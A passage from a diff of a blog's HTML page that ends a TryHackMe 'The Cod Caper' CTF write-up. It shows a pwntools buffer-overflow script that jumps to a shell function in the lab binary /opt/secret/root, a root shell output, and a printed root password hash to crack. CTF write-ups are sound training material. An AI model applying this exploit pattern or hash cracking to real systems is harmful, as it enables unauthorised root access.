frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/the-penguin-123GivAQB7k0s8"></a></p><!--kg-card-end: html--><!--kg-card-begin: html--><a href="https://www.patreon.com/bePatron?u=45903047" data-patreon-widget-type="become-patron-button">You can support my content, and help me do more and more by becoming a Patron!</a><script async src="https://c6.patreon.com/becomePatronButton.bundle.js"></script><!--kg-card-end: html-->
-                </div>
-            </section>
+uid=0(root) gid=0(root) groups=0(root)</code></pre><p>Pwntools is a python library dedicated to making everything we just did in the last task much simpler. However, since it is a library, it requires python knowledge to use to it's full potential, and as such everything in this task will be done using a python script.<br>We start off the script with:</p><p><code>from pwn import *</code><br><code>proc = process('/opt/secret/root')</code></p><p>This imports all the utilities from the pwntools library so we can use them in our script, and then creates a process that we can interact with using pwntools functions.</p><p>We know that we need the memory address of the shell function, and pwntools provides a way to obtain that with ELF(). ELF allows us to get various memory addresses of important points in our binary, including the memory address of the shell function.<br>With the ELF addition our script becomes<br><code>from pwn import *</code><br><code>proc = process('/opt/secret/root')</code><br><code>elf = ELF('/opt/secret/root')</code><br><code>shell_func = elf.symbols.shell</code><br>shell_func holds the memory address of our shell function. Now we need a way to form the payload, luckily pwntools has that to with fit().</p><p>fit allows us to form a payload by combining characters and our memory address. To send the payload we can use a method in our <code>proc</code> variable, proc.sendline(), which just sends whatever data we want to the binary. Finally we can use proc.interactive(), to view the full output of the process.<br>With all that our final exploit script becomes<br><code>from pwn import *</code><br><code>proc = process('/opt/secret/root')</code><br><code>elf = ELF('/opt/secret/root')</code><br><code>shell_func = elf.symbols.shell</code><br><code>payload = fit({</code><br><code>44: shell_func # this adds the value of shell_func after 44 characters</code><br><code>})</code><br><code>proc.sendline(payload)</code><br><code>proc.interactive()</code><br>Save that to a .py file and run it, and you should get this output:</p><figure class="kg-card kg-image-card"><img src="../content/images/2020/04/Screenshot-2020-04-14-at-19.38.53.png" class="kg-image" alt loading="lazy"></figure><p>Now that we have the password hashes, we can crack them and get the root password! Recall from the previous outputs that our root password hash is <code>$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.</code><strong>"</strong></p><p>Happy hacking!</p><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/room/thecodcaper"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | The Cod Caper</div><div class="kg-bookmark-description">A guided room taking you through infiltrating and exploiting a Linux system.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt=""><span class="kg-bookmark-author">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://tryhackme-images.s3.amazonaws.com/room-icons/282c55307eada4ad18a0b06e4d65ff34.jpeg" alt=""></div></a></figure><figure class="kg-card kg-bookmark-card"><a class="kg-bookmark-container" href="https://tryhackme.com/"><div class="kg-bookmark-content"><div class="kg-bookmark-title">TryHackMe | Hacking Training</div><div class="kg-bookmark-description">An online platform for learning and teaching cyber security, all through your browser.</div><div class="kg-bookmark-metadata"><img class="kg-bookmark-icon" src="https://tryhackme.com/img/favicon.png" alt=""><span class="kg-bookmark-author">TryHackMe</span></div></div><div class="kg-bookmark-thumbnail"><img src="https://tryhackme.com/img/favicon.png" alt=""></div></a></figure><!--kg-card-begin: html--><iframe src="https://giphy.com/embed/123GivAQB7k0s8" width="480" height="277" frameBorder="0" class="giphy-embed" allowFullScreen></iframe><p><a href="https://giphy.com/gifs/the-penguin-123GivAQB7k0s8"></a></p><!--kg-card-end: html--><figure class="kg-card kg-image-card kg-card-hascaption"><img src="../content/images/2022/03/crypto-coins-3.png" class="kg-image" alt loading="lazy" width="250" height="79"><figcaption>Crypto donations are appreciated for more free content and exciting topics <strong>0x684c21519d43E415506c1750c08FA0A97621FFEF</strong></figcaption></figure>
+        </section>
 
 
-            
-            <script>talkyardServerUrl='https://comments-for-fr33s0ul-tech.talkyard.net';</script>
-<script async defer src="https://c1.ty-cdn.net/-/talkyard-comments.min.js"></script>
-<div class="talkyard-comments" data-discussion-id="5e90424a5e61514e230adc77" style="margin-top: 45px;">
-<noscript>Please enable Javascript to view comments.</noscript>
-</div>
-            
-
-        </article>
-
-    </div>
+    </article>
 </main>
 
-<aside class="read-next outer">
-    <div class="inner">
-        <div class="read-next-feed">
-                <article class="read-next-card">
-                    <header class="read-next-card-header">
-                        <h3><span>More in</span> <a href="../tag/ctf/index.html">CTF</a></h3>
-                    </header>
-                    <div class="read-next-card-content">
-                        <ul>
-                            <li>
-                                <h4><a href="../yearoftherabbit-ctf-write-up/index.html">YearOfTheRabbit | CTF write-up</a></h4>
-                                <div class="read-next-card-meta">
-                                    <p><time datetime="2020-04-22">22 Apr 2020</time> –
-                                        9 min read</p>
-                                </div>
-                            </li>
-                            <li>
-                                <h4><a href="../dogcat-thm-write-up/index.html">dogcat | THM write-up</a></h4>
-                                <div class="read-next-card-meta">
-                                    <p><time datetime="2020-04-19">19 Apr 2020</time> –
-                                        6 min read</p>
-                                </div>
-                            </li>
-                            <li>
-                                <h4><a href="../lfi/index.html">Local file inclusion | write-up</a></h4>
-                                <div class="read-next-card-meta">
-                                    <p><time datetime="2020-04-17">17 Apr 2020</time> –
-                                        6 min read</p>
-                                </div>
-                            </li>
-                        </ul>
-                    </div>
-                    <footer class="read-next-card-footer">
-                        <a href="../tag/ctf/index.html">See all 15 posts
-                            →</a>
-                    </footer>
-                </article>
 
-                <article class="post-card post tag-ctf ">
-
-    <a class="post-card-image-link" href="../attacktive-directory-thm-write-up/index.html">
-        <img class="post-card-image"
-            srcset="../content/images/size/w300/2020/04/aD.png 300w,
-                   ../content/images/size/w600/2020/04/aD.png 600w,
-                  ../content/images/size/w1000/2020/04/aD. png 1000w,
-                 ../content/images/size/w2000/2020/04/aD. png 2000w"
-            sizes="(max-width: 1000px) 400px, 700px"
-            loading="lazy"
-            src="../content/images/size/w600/2020/04/aD.png"
-            alt="Attacktive Directory | THM write-up"
-        />
-    </a>
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="../attacktive-directory-thm-write-up/index.html">
-
-            <header class="post-card-header">
-                    <div class="post-card-primary-tag">CTF</div>
-                <h2 class="post-card-title">Attacktive Directory | THM write-up</h2>
-            </header>
-
-            <section class="post-card-excerpt">
-                    <p>Hello world! today's challenge is very unique, we will go through the steps to exploit an active directory. The challenge is designed by a user called Sp00ky. in my opinion,</p>
-            </section>
-
-        </a>
-
-        <footer class="post-card-meta">
-            <ul class="author-list">
-                <li class="author-list-item">
-            
-                    <div class="author-name-tooltip">
-                        fr33s0ul
-                    </div>
-            
-                    <a href="../author/fr33s0ul/index.html" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" />
-                    </a>
-                </li>
-            </ul>
-            <div class="post-card-byline-content">
-                <span><a href="../author/fr33s0ul/index.html">fr33s0ul</a></span>
-                <span class="post-card-byline-date"><time datetime="2020-04-17">17 Apr 2020</time> <span class="bull">&bull;</span> 23 min read</span>
-            </div>
-        </footer>
-
-    </div>
-
-</article>
-
-                <article class="post-card post tag-ctf ">
-
-    <a class="post-card-image-link" href="../bebop-drone-lovers-ctf/index.html">
-        <img class="post-card-image"
-            srcset="../content/images/size/w300/2020/04/Dr63yPm.png 300w,
-                   ../content/images/size/w600/2020/04/Dr63yPm.png 600w,
-                  ../content/images/size/w1000/2020/04/Dr63yPm. png 1000w,
-                 ../content/images/size/w2000/2020/04/Dr63yPm. png 2000w"
-            sizes="(max-width: 1000px) 400px, 700px"
-            loading="lazy"
-            src="../content/images/size/w600/2020/04/Dr63yPm.png"
-            alt="bebop | drone lovers CTF"
-        />
-    </a>
-
-    <div class="post-card-content">
-
-        <a class="post-card-content-link" href="../bebop-drone-lovers-ctf/index.html">
-
-            <header class="post-card-header">
-                    <div class="post-card-primary-tag">CTF</div>
-                <h2 class="post-card-title">bebop | drone lovers CTF</h2>
-            </header>
-
-            <section class="post-card-excerpt">
-                    <p>Hello everyone, Today's CTF is available at www.Tryhackme.com rated as an easy challenge so it won't be hard for someone just starting in the field, the concept is</p>
-            </section>
-
-        </a>
-
-        <footer class="post-card-meta">
-            <ul class="author-list">
-                <li class="author-list-item">
-            
-                    <div class="author-name-tooltip">
-                        fr33s0ul
-                    </div>
-            
-                    <a href="../author/fr33s0ul/index.html" class="static-avatar">
-                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" />
-                    </a>
-                </li>
-            </ul>
-            <div class="post-card-byline-content">
-                <span><a href="../author/fr33s0ul/index.html">fr33s0ul</a></span>
-                <span class="post-card-byline-date"><time datetime="2020-04-13">13 Apr 2020</time> <span class="bull">&bull;</span> 3 min read</span>
-            </div>
-        </footer>
-
-    </div>
-
-</article>
+    <section class="footer-cta cta-alt">
+        <div class="inner">
+            <h2>Sign up for more like this.</h2>
+            <a class="footer-cta-button" href="index.html#/portal" data-portal>
+                <div class="footer-cta-input">Enter your email</div>
+                <span>Subscribe</span>
+            </a>
         </div>
-    </div>
-</aside>
+    </section>
 
 
 
 
-        <footer class="site-footer outer">
-            <div class="site-footer-content inner">
-                <section class="copyright"><a href="../index.html">fr33s0ul</a> &copy; 2020</section>
-                <nav class="site-footer-nav">
-                    <a href="../index.html">Latest Posts</a>
-                    
-                    <a href="https://twitter.com/fr3350u1" target="_blank" rel="noopener">Twitter</a>
-                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
-                </nav>
+            <aside class="read-more-wrap">
+                <div class="read-more inner">
+                        
+<article class="post-card post ">
+
+    <a class="post-card-image-link" href="../that-path-to-ai-8-hacking-ai-with-adv-machine-learning/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2020/11/aiHackss-1.gif 300w,
+                   ../content/images/size/w600/2020/11/aiHackss-1. gif 600w,
+                  ../content/images/size/w1000/2020/11/aiHackss-1. gif 1000w,
+                 ../content/images/size/w2000/2020/11/aiHackss-1. gif 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2020/11/aiHackss-1.gif"
+            alt="That path to Ai: #8 Hacking Ai with Adv machine learning"
+            loading="lazy"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="../that-path-to-ai-8-hacking-ai-with-adv-machine-learning/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">That path to Ai: #8 Hacking Ai with Adv machine learning</h2>
+            </header>
+            <div class="post-card-excerpt">
+                <p>Adversarial machine learning Adversarial machine learning exploits how artificial intelligence algorithms work to disrupt the conduct of artificial intelligence algorithms. In the past years, adversarial machine learning has become an active zone of research as the job of AI continues to grow in vast numbers of the applications we use.</p>
+            </div>
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/fr33s0ul/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" loading="lazy" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span class="post-card-byline-author"><a href="../author/fr33s0ul/index.html">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-11-21">Nov 21, 2020</time> <span class="bull">&bull;</span> 3 min read</span>
             </div>
         </footer>
 
     </div>
 
+</article>
+                        
+<article class="post-card post ">
 
-    <script
-        src="https://code.jquery.com/jquery-3.4.1.min.js"
-        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
-        crossorigin="anonymous">
-    </script>
-    <script src="../assets/built/casper.js?v=8ba882e352"></script>
+    <a class="post-card-image-link" href="../that-path-to-ai-7/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2020/11/dnn.png 300w,
+                   ../content/images/size/w600/2020/11/dnn.png 600w,
+                  ../content/images/size/w1000/2020/11/dnn. png 1000w,
+                 ../content/images/size/w2000/2020/11/dnn. png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2020/11/dnn.png"
+            alt="That path to Ai: #7 CNNs, RNNs, Feature eng ML / imputaxon"
+            loading="lazy"
+        />
+    </a>
 
-    <script>
-        // Parse the URL parameter
-        function getParameterByName(name, url) {
-            if (!url) url = window.location.href;
-            name = name.replace(/[\[\]]/g, "\\$&");
-            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
-                results = regex.exec(url);
-            if (!results) return null;
-            if (!results[2]) return '';
-            return decodeURIComponent(results[2].replace(/\+/g, " "));
-        }
+    <div class="post-card-content">
 
-        // Give the parameter a variable name
-        var action = getParameterByName('action');
-        var success = getParameterByName('success');
+        <a class="post-card-content-link" href="../that-path-to-ai-7/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">That path to Ai: #7 CNNs, RNNs, Feature eng ML / imputaxon</h2>
+            </header>
+            <div class="post-card-excerpt">
+                <p>Convolutional Neural Networks (CNNs) A Convolutional Neural Networks (CNNs) is a Deep Learning algorithm which can take in an input picture, appoint significance (learnable weights and biases) to different articles in the image and have the option to separate one from the other. The pre-processing required in a CNNs; it</p>
+            </div>
+        </a>
 
-        $(document).ready(function () {
-            if (action == 'subscribe' && (success === null || success === 'true')) {
-                $('body').addClass('subscribe-success');
-            }
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/fr33s0ul/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" loading="lazy" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span class="post-card-byline-author"><a href="../author/fr33s0ul/index.html">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-11-21">Nov 21, 2020</time> <span class="bull">&bull;</span> 3 min read</span>
+            </div>
+        </footer>
 
-            if (action == 'subscribe' && success === 'false') {
-                $('body').addClass('subscribe-failure');
-            }
+    </div>
 
-            $('.subscribe-notification .subscribe-close-button').click(function () {
-                $('.subscribe-notification').addClass('close');
-            });
+</article>
+                        
+<article class="post-card post ">
 
-            // Reset form on opening subscrion overlay
-            $('.subscribe-button').click(function() {
-                $('.subscribe-overlay form').removeClass();
-                $('.subscribe-email').val('');
-            });
-        });
-    </script>
+    <a class="post-card-image-link" href="../that-path-to-ai-6/index.html">
+        <img class="post-card-image"
+            srcset="../content/images/size/w300/2020/11/Dimensionality.png 300w,
+                   ../content/images/size/w600/2020/11/Dimensionality.png 600w,
+                  ../content/images/size/w1000/2020/11/Dimensionality. png 1000w,
+                 ../content/images/size/w2000/2020/11/Dimensionality. png 2000w"
+            sizes="(max-width: 1000px) 400px, 800px"
+            src="../content/images/size/w600/2020/11/Dimensionality.png"
+            alt="That path to Ai: #6 Dimensionality reduction / and ens learning to improve classifi..."
+            loading="lazy"
+        />
+    </a>
 
-    <script>
-    $(document).ready(function () {
-        // FitVids - start
-        var $postContent = $(".post-full-content");
-        $postContent.fitVids();
-        // FitVids - end
+    <div class="post-card-content">
 
-        // Replace nav with title on scroll - start
-        Casper.stickyNavTitle({
-            navSelector: '.site-nav-main',
-            titleSelector: '.post-full-title',
-            activeClass: 'nav-post-title-active'
-        });
-        // Replace nav with title on scroll - end
+        <a class="post-card-content-link" href="../that-path-to-ai-6/index.html">
+            <header class="post-card-header">
+                <h2 class="post-card-title">That path to Ai: #6 Dimensionality reduction / and ens learning to improve classifi...</h2>
+            </header>
+            <div class="post-card-excerpt">
+                <p>Dimensionality reduction is a set of machine learning-based indicative models. They are useful to execute data manipulation; it decreases the dimensionality of a dataset. It is instrumental in cases where the issue becomes intractable, and the quantity of variables increases, then dimensionality reduction leads to choosing significant variables. Low variance</p>
+            </div>
+        </a>
 
-        // Hover on avatar
-        var hoverTimeout;
-        $('.author-list-item').hover(function () {
-            var $this = $(this);
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+                    <a href="../author/fr33s0ul/index.html" class="static-avatar">
+                        <img class="author-profile-image" src="../content/images/size/w100/2020/03/asdasd.gif" alt="fr33s0ul" loading="lazy" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span class="post-card-byline-author"><a href="../author/fr33s0ul/index.html">fr33s0ul</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-11-21">Nov 21, 2020</time> <span class="bull">&bull;</span> 4 min read</span>
+            </div>
+        </footer>
 
-            clearTimeout(hoverTimeout);
+    </div>
 
-            $('.author-card').removeClass('hovered');
-            $(this).children('.author-card').addClass('hovered');
+</article>
+                </div>
+            </aside>
 
-        }, function () {
-            var $this = $(this);
 
-            hoverTimeout = setTimeout(function () {
-                $this.children('.author-card').removeClass('hovered');
-            }, 800);
-        });
+
+    </div>
+
+    <footer class="site-footer outer">
+        <div class="inner">
+            <section class="copyright"><a href="../index.html">fr33s0ul</a> &copy; 2022</section>
+            <nav class="site-footer-nav">
+                
+            </nav>
+            <div><a href="https://ghost.org/" target="_blank" rel="noopener">Powered by Ghost</a></div>
+        </div>
+    </footer>
+
+</div>
+
+
+<script
+    src="https://code.jquery.com/jquery-3.5.1.min.js"
+    integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0="
+    crossorigin="anonymous">
+</script>
+<script src="../assets/built/casper.js?v=7717a9b749"></script>
+<script>
+$(document).ready(function () {
+    // Mobile Menu Trigger
+    $('.gh-burger').click(function () {
+        $('body').toggleClass('gh-head-open');
     });
+    // FitVids - Makes video embeds responsive
+    $(".gh-content").fitVids();
+});
 </script>
 
 
-    
 
 </body>
 </html>
